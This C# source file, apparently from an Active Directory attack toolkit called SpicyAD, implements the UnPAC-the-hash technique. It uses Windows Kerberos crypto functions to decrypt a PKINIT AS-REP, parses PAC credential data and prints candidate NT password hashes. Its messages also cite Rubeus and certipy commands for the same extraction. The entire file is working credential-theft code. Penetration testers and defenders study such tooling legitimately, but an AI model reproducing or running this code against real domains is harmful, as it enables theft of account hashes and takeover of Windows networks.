using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace SpicyAD
{
    public static class UnpacTheHash
    {
        // P/Invoke for cryptdll.dll (Windows Kerberos crypto)
        [DllImport("cryptdll.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int CDLocateCSystem(KERB_ETYPE etype, out IntPtr pCheckSum);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int KERB_ECRYPT_Initialize(byte[] key, int keySize, int keyUsage, out IntPtr pContext);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int KERB_ECRYPT_Decrypt(IntPtr pContext, byte[] data, int dataSize, byte[] output, ref int outputSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int KERB_ECRYPT_Finish(ref IntPtr pContext);

        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_ECRYPT
        {
            public int Type0;
            public int BlockSize;
            public int Type1;
            public int KeySize;
            public int Size;
            public int Type2;
            public int Type3;
            public IntPtr AlgName;
            public IntPtr Initialize;
            public IntPtr Encrypt;
            public IntPtr Decrypt;
            public IntPtr Finish;
            public IntPtr HashPassword;
            public IntPtr RandomKey;
            public IntPtr Control;
            public IntPtr unk0_null;
            public IntPtr unk1_null;
            public IntPtr unk2_null;
        }

        public enum KERB_ETYPE : int
        {
            des_cbc_crc = 1,
            des_cbc_md4 = 2,
            des_cbc_md5 = 3,
            des3_cbc_md5 = 5,
            des3_cbc_sha1 = 7,
            dsaWithSHA1_CmsOID = 9,
            md5WithRSAEncryption_CmsOID = 10,
            sha1WithRSAEncryption_CmsOID = 11,
            rc2CBC_EnvOID = 12,
            rsaEncryption_EnvOID = 13,
            rsaES_OAEP_ENV_OID = 14,
            des_ede3_cbc_Env_OID = 15,
            des3_cbc_sha1_kd = 16,
            aes128_cts_hmac_sha1 = 17,
            aes256_cts_hmac_sha1 = 18,
            rc4_hmac = 23,
            rc4_hmac_exp = 24,
            subkey_keymaterial = 65
        }

        // Key usage numbers for Kerberos
        private const int KRB_KEY_USAGE_AS_REP_ENCPART = 3;
        private const int KRB_KEY_USAGE_TGS_REP_ENCPART = 8;
        private const int KRB_KEY_USAGE_PAC_CREDENTIAL_DATA = 16;

        
        /// Decrypt data using Windows Kerberos crypto subsystem
        public static byte[] KerberosDecrypt(KERB_ETYPE eType, int keyUsage, byte[] key, byte[] data)
        {
            IntPtr pCSystemPtr;
            int status = CDLocateCSystem(eType, out pCSystemPtr);
            if (status != 0)

                throw new Exception($"CDLocateCSystem failed: 0x{status:X8}");

            KERB_ECRYPT pCSystem = (KERB_ECRYPT)Marshal.PtrToStructure(pCSystemPtr, typeof(KERB_ECRYPT));

            IntPtr pContext;
            KERB_ECRYPT_Initialize initFunc = (KERB_ECRYPT_Initialize)Marshal.GetDelegateForFunctionPointer(
                pCSystem.Initialize, typeof(KERB_ECRYPT_Initialize));
            KERB_ECRYPT_Decrypt decryptFunc = (KERB_ECRYPT_Decrypt)Marshal.GetDelegateForFunctionPointer(
                pCSystem.Decrypt, typeof(KERB_ECRYPT_Decrypt));
            KERB_ECRYPT_Finish finishFunc = (KERB_ECRYPT_Finish)Marshal.GetDelegateForFunctionPointer(
                pCSystem.Finish, typeof(KERB_ECRYPT_Finish));
            
            status = initFunc(key, key.Length, keyUsage, out pContext);
            if (status != 0)
                throw new Exception($"Initialize failed: 0x{status:X8}");

            int outputSize = data.Length;
            if (data.Length % pCSystem.BlockSize != 0)
                outputSize += pCSystem.BlockSize - (data.Length % pCSystem.BlockSize);
            outputSize += pCSystem.Size;

            byte[] output = new byte[outputSize];

            status = decryptFunc(pContext, data, data.Length, output, ref outputSize);
            finishFunc(ref pContext);

            if (status != 0)
                throw new Exception($"Decrypt failed: 0x{status:X8}");

            return output.Take(outputSize).ToArray();
        }

        
        /// Extract NT hash from AS-REP using PKINIT session key (UnPAC-the-hash)
        public static void ExtractCredentials(byte[] asRep, byte[] replyKey, KERB_ETYPE sessionKeyEtype)
        {
            OutputHelper.Verbose("\n[*] UnPAC-the-hash: Extracting credentials from AS-REP...");
            OutputHelper.Verbose($"[*] Reply key length: {replyKey.Length} bytes");
            OutputHelper.Verbose($"[*] Reply key: {BitConverter.ToString(replyKey).Replace("-", "")}");

            try
            {
                // The reply key is the correctly derived key from DH + kTruncate
                // Use it to decrypt the enc-part to get the actual session key

                // Parse AS-REP to find enc-part
                byte[] encPart = ExtractEncPartFromAsRep(asRep);
                if (encPart == null || encPart.Length == 0)
                {
                    Console.WriteLine("[!] Could not extract enc-part from AS-REP");
                    return;
                }
                OutputHelper.Verbose($"[+] Extracted enc-part ({encPart.Length} bytes)");

                // Try decryption with the reply key (AES256)
                byte[] decryptedEncPart = null;
                byte[] actualSessionKey = null;
                KERB_ETYPE actualEtype = KERB_ETYPE.aes256_cts_hmac_sha1;

                OutputHelper.Verbose("[*] Decrypting enc-part with AES256...");
                try
                {
                    decryptedEncPart = KerberosDecrypt(KERB_ETYPE.aes256_cts_hmac_sha1, KRB_KEY_USAGE_AS_REP_ENCPART, replyKey, encPart);
                    OutputHelper.Verbose($"[+] Successfully decrypted enc-part ({decryptedEncPart.Length} bytes)!");
                }
                catch (Exception ex1)
                {
                    Console.WriteLine($"[!] AES256 decryption failed: {ex1.Message}");
                    return;
                }

                // Parse EncASRepPart to get the actual session key
                actualSessionKey = ExtractSessionKeyFromEncAsRepPart(decryptedEncPart, out int keyType);
                if (actualSessionKey != null)
                {
                    actualEtype = (KERB_ETYPE)keyType;
                    OutputHelper.Verbose($"[+] Extracted actual session key from EncASRepPart:");
                    OutputHelper.Verbose($"    Key Type: {keyType} ({actualEtype})");
                    OutputHelper.Verbose($"    Key Value: {BitConverter.ToString(actualSessionKey).Replace("-", "")}");
                }

                // Now look for PA-PAC-CREDENTIALS (type 167) in padata
                OutputHelper.Verbose("\n[*] Looking for PA-PAC-CREDENTIALS (type 167) in AS-REP padata...");
                byte[] encPaCredentials = ExtractPaPacCredentials(asRep);

                if (encPaCredentials != null && encPaCredentials.Length > 0)
                {
                    OutputHelper.Verbose($"[+] Found enc-pa-data ({encPaCredentials.Length} bytes)");

                    // Decrypt using the actual session key from EncASRepPart
                    byte[] keyToUse = actualSessionKey ?? replyKey;

                    try
                    {
                        // Key usage 16 = KRB_KEY_USAGE_PA_PAC_CREDENTIALS
                        byte[] decryptedCredData = KerberosDecrypt(actualEtype, KRB_KEY_USAGE_PAC_CREDENTIAL_DATA, keyToUse, encPaCredentials);
                        OutputHelper.Verbose($"[+] Successfully decrypted PA-PAC-CREDENTIALS ({decryptedCredData.Length} bytes)!");
                        ParsePacCredentialData(decryptedCredData);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[!] Failed to decrypt PA-PAC-CREDENTIALS: {ex.Message}");
                    }
                }
                else
                {
                    OutputHelper.Verbose("[*] No PA-PAC-CREDENTIALS in AS-REP padata");
                    OutputHelper.Verbose("[*] The NT hash must be extracted via U2U (User-to-User) TGS request");
                    OutputHelper.Verbose("[*] This is the standard UnPAC-the-hash technique:");
                    OutputHelper.Verbose("    1. Use obtained TGT to request a U2U service ticket for yourself");
                    OutputHelper.Verbose("    2. The PAC in the TGS-REP contains PAC_CREDENTIAL_INFO");
                    OutputHelper.Verbose("    3. Decrypt with session key to get NT hash");
                    OutputHelper.Verbose("\n[*] To extract NT hash, use Rubeus:");
                    OutputHelper.Verbose("    Rubeus.exe asktgt /certificate:<pfx> /getcredentials /nowrap");
                    OutputHelper.Verbose("\n[*] Or with certipy (Linux):");
                    OutputHelper.Verbose("    certipy auth -pfx <pfx_file> -dc-ip <DC_IP>");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error extracting credentials: {ex.Message}");
            }
        }

        
        /// Extract the session key from decrypted EncASRepPart
        private static byte[] ExtractSessionKeyFromEncAsRepPart(byte[] decryptedEncPart, out int keyType)
        {
            keyType = 0;
            int offset = 0;

            // Skip APPLICATION tag if present (EncASRepPart is APPLICATION 25)
            if (decryptedEncPart[offset] == 0x79) // APPLICATION 25
            {
                offset++;
                offset += DecodeLength(decryptedEncPart, offset, out _);
            }

            // Skip SEQUENCE
            if (decryptedEncPart[offset] == 0x30)
            {
                offset++;
                offset += DecodeLength(decryptedEncPart, offset, out _);
            }

            // Find key [0]
            if (decryptedEncPart[offset] == 0xA0)
            {
                offset++;
                offset += DecodeLength(decryptedEncPart, offset, out _);

                // EncryptionKey ::= SEQUENCE { keytype [0] Int32, keyvalue [1] OCTET STRING }
                if (decryptedEncPart[offset] == 0x30)
                {
                    offset++;
                    offset += DecodeLength(decryptedEncPart, offset, out _);

                    // keytype [0]
                    if (decryptedEncPart[offset] == 0xA0)
                    {
                        offset++;
                        offset += DecodeLength(decryptedEncPart, offset, out _);
                        if (decryptedEncPart[offset] == 0x02)
                        {
                            offset++;
                            int intLen = decryptedEncPart[offset++];
                            for (int i = 0; i < intLen; i++)
                                keyType = (keyType << 8) | decryptedEncPart[offset++];
                        }
                    }

                    // keyvalue [1]
                    if (decryptedEncPart[offset] == 0xA1)
                    {
                        offset++;
                        offset += DecodeLength(decryptedEncPart, offset, out _);
                        if (decryptedEncPart[offset] == 0x04)
                        {
                            offset++;
                            int keyLen;
                            offset += DecodeLength(decryptedEncPart, offset, out keyLen);
                            byte[] keyValue = new byte[keyLen];
                            Array.Copy(decryptedEncPart, offset, keyValue, 0, keyLen);
                            return keyValue;
                        }
                    }
                }
            }
            return null;
        }

        
        /// Extract PA-PAC-CREDENTIALS (padata type 167) from AS-REP
        private static byte[] ExtractPaPacCredentials(byte[] asRep)
        {
            const int PA_PAC_CREDENTIALS = 167;
            int offset = 0;

            // Skip APPLICATION tag
            if (asRep[offset] == 0x6B)
            {
                offset++;
                offset += DecodeLength(asRep, offset, out _);
            }

            // Skip outer SEQUENCE
            if (asRep[offset] == 0x30)
            {
                offset++;
                offset += DecodeLength(asRep, offset, out _);
            }

            // Find padata [2]
            int searchEnd = Math.Min(offset + 500, asRep.Length - 10);
            int padataOffset = -1;
            int padataEnd = -1;

            while (offset < searchEnd)
            {
                if (asRep[offset] == 0xA2)
                {
                    offset++;
                    int padataLen;
                    offset += DecodeLength(asRep, offset, out padataLen);
                    padataOffset = offset;
                    padataEnd = offset + padataLen;
                    break;
                }
                else if ((asRep[offset] & 0xE0) == 0xA0)
                {
                    offset++;
                    int skipLen;
                    offset += DecodeLength(asRep, offset, out skipLen);
                    offset += skipLen;
                }
                else
                {
                    offset++;
                }
            }

            if (padataOffset < 0) return null;

            // Parse padata SEQUENCE to find PA-PAC-CREDENTIALS (type 167)
            int pos = padataOffset;
            if (asRep[pos] == 0x30)
            {
                pos++;
                pos += DecodeLength(asRep, pos, out _);
            }

            while (pos < padataEnd - 5)
            {
                if (asRep[pos] != 0x30)
                {
                    pos++;
                    continue;
                }

                int paDataStart = pos;
                pos++;
                int paDataLen;
                pos += DecodeLength(asRep, pos, out paDataLen);
                int paDataContentEnd = pos + paDataLen;

                int padataType = -1;
                int valueOffset = -1;
                int valueLen = 0;

                while (pos < paDataContentEnd)
                {
                    byte tag = asRep[pos];
                    if (tag == 0xA1) // padata-type [1]
                    {
                        pos++;
                        pos += DecodeLength(asRep, pos, out _);
                        if (asRep[pos] == 0x02)
                        {
                            pos++;
                            int intLen = asRep[pos++];
                            padataType = 0;
                            for (int i = 0; i < intLen; i++)
                                padataType = (padataType << 8) | asRep[pos++];
                        }
                    }
                    else if (tag == 0xA2) // padata-value [2]
                    {
                        pos++;
                        int ctxLen;
                        pos += DecodeLength(asRep, pos, out ctxLen);
                        if (asRep[pos] == 0x04)
                        {
                            pos++;
                            pos += DecodeLength(asRep, pos, out valueLen);
                            valueOffset = pos;
                            pos += valueLen;
                        }
                        else
                        {
                            valueOffset = pos;
                            valueLen = ctxLen;
                            pos += ctxLen;
                        }
                    }
                    else
                    {
                        pos++;
                        if (pos < paDataContentEnd)
                        {
                            int skipLen;
                            pos += DecodeLength(asRep, pos, out skipLen);
                            pos += skipLen;
                        }
                    }
                }

                if (padataType == PA_PAC_CREDENTIALS && valueOffset > 0)
                {
                    OutputHelper.Verbose($"[+] Found PA-PAC-CREDENTIALS at offset {paDataStart}");
                    byte[] result = new byte[valueLen];
                    Array.Copy(asRep, valueOffset, result, 0, valueLen);
                    return result;
                }

                pos = paDataContentEnd;
            }

            return null;
        }

        
        /// Parse PAC_CREDENTIAL_DATA to extract NTLM hash
        private static void ParsePacCredentialData(byte[] data)
        {
            OutputHelper.Verbose($"[*] Parsing PAC_CREDENTIAL_DATA ({data.Length} bytes)...");
            OutputHelper.Verbose($"[*] First 32 bytes: {BitConverter.ToString(data.Take(Math.Min(32, data.Length)).ToArray())}");

            // PAC_CREDENTIAL_DATA structure:
            // DWORD CredentialCount
            // SECPKG_SUPPLEMENTAL_CRED Credentials[CredentialCount]
            //
            // SECPKG_SUPPLEMENTAL_CRED:
            //   RPC_UNICODE_STRING PackageName
            //   DWORD CredentialSize
            //   BYTE* Credentials

            if (data.Length < 4)
            {
                Console.WriteLine("[!] Data too short for PAC_CREDENTIAL_DATA");
                return;
            }

            int offset = 0;
            uint credentialCount = BitConverter.ToUInt32(data, offset);
            offset += 4;
            OutputHelper.Verbose($"[*] Credential count: {credentialCount}");

            for (uint i = 0; i < credentialCount && offset < data.Length - 20; i++)
            {
                // Skip RPC_UNICODE_STRING (8 bytes: length, maxlength, pointer)
                if (offset + 8 > data.Length) break;
                ushort packageNameLen = BitConverter.ToUInt16(data, offset);
                offset += 8; // Skip the full RPC_UNICODE_STRING structure

                uint credSize = 0;
                if (offset + 4 <= data.Length)
                {
                    credSize = BitConverter.ToUInt32(data, offset);
                    offset += 4;
                }

                OutputHelper.Verbose($"[*] Credential {i + 1}: PackageNameLen={packageNameLen}, CredSize={credSize}");

                // Look for NTLM credentials pattern
                // The NTLM hash is typically at offset 24 in KERB_STORED_CREDENTIAL
                if (credSize >= 24 && offset + credSize <= data.Length)
                {
                    // Search for 16-byte NT hash within credential data
                    for (int j = 0; j < credSize - 16; j++)
                    {
                        if (offset + j + 16 <= data.Length)
                        {
                            byte[] potential = new byte[16];
                            Array.Copy(data, offset + j, potential, 0, 16);

                            // Check if it looks like a hash (not all zeros, not all same)
                            if (!potential.All(b => b == 0) && !potential.All(b => b == potential[0]))
                            {
                                OutputHelper.Verbose($"[+] Potential hash at offset +{j}: {BitConverter.ToString(potential).Replace("-", "")}");
                            }
                        }
                    }
                    offset += (int)credSize;
                }
            }

            // Fallback: Search entire data for 16-byte patterns
            OutputHelper.Verbose("\n[*] Searching for NT hash patterns in credential data...");
            for (int i = 0; i < data.Length - 16; i++)
            {
                byte[] candidate = new byte[16];
                Array.Copy(data, i, candidate, 0, 16);

                // Check entropy - a real NT hash should have high entropy
                bool highEntropy = true;
                int uniqueBytes = candidate.Distinct().Count();
                if (uniqueBytes < 8) highEntropy = false; // Too low entropy

                if (highEntropy && !candidate.All(b => b == 0))
                {
                    // Potential NT hash
                    OutputHelper.Verbose($"[+] Candidate NT hash at offset {i}: {BitConverter.ToString(candidate).Replace("-", "")}");
                }
            }
        }

        private static byte[] ExtractEncPartFromAsRep(byte[] asRep)
        {
            // AS-REP structure: [APPLICATION 11] SEQUENCE {
            //   pvno [0], msg-type [1], padata [2], crealm [3], cname [4], ticket [5], enc-part [6]
            // }
            // enc-part [6] contains EncryptedData: SEQUENCE { etype [0], kvno [1] optional, cipher [2] }

            int offset = 0;

            // Skip APPLICATION 11 tag
            if (asRep[offset] == 0x6B)
            {
                offset++;
                offset += DecodeLength(asRep, offset, out _);
            }

            // Skip outer SEQUENCE
            if (asRep[offset] == 0x30)
            {
                offset++;
                offset += DecodeLength(asRep, offset, out _);
            }

            // Find enc-part [6] (tag 0xA6)
            while (offset < asRep.Length - 10)
            {
                if (asRep[offset] == 0xA6)
                {
                    offset++;
                    int encPartContainerLen;
                    offset += DecodeLength(asRep, offset, out encPartContainerLen);

                    // Now at EncryptedData SEQUENCE
                    if (asRep[offset] == 0x30)
                    {
                        offset++;
                        int encDataLen;
                        offset += DecodeLength(asRep, offset, out encDataLen);

                        // Parse EncryptedData to find cipher [2]
                        int encDataEnd = offset + encDataLen;
                        while (offset < encDataEnd)
                        {
                            if (asRep[offset] == 0xA2) // cipher [2]
                            {
                                offset++;
                                offset += DecodeLength(asRep, offset, out _);

                                // Should be OCTET STRING
                                if (asRep[offset] == 0x04)
                                {
                                    offset++;
                                    int cipherLen;
                                    offset += DecodeLength(asRep, offset, out cipherLen);

                                    byte[] cipher = new byte[cipherLen];
                                    Array.Copy(asRep, offset, cipher, 0, cipherLen);
                                    return cipher;
                                }
                            }
                            else if ((asRep[offset] & 0xE0) == 0xA0)
                            {
                                offset++;
                                int skipLen;
                                offset += DecodeLength(asRep, offset, out skipLen);
                                offset += skipLen;
                            }
                            else
                            {
                                offset++;
                            }
                        }
                    }
                    break;
                }
                else if ((asRep[offset] & 0xE0) == 0xA0)
                {
                    offset++;
                    int skipLen;
                    offset += DecodeLength(asRep, offset, out skipLen);
                    offset += skipLen;
                }
                else
                {
                    offset++;
                }
            }

            return null;
        }

        private static int DecodeLength(byte[] data, int offset, out int length)
        {
            if ((data[offset] & 0x80) == 0)
            {
                length = data[offset];
                return 1;
            }
            else
            {
                int numBytes = data[offset] & 0x7F;
                length = 0;
                for (int i = 1; i <= numBytes && offset + i < data.Length; i++)
                {
                    length = (length << 8) | data[offset + i];
                }
                return 1 + numBytes;
            }
        }
    }
}
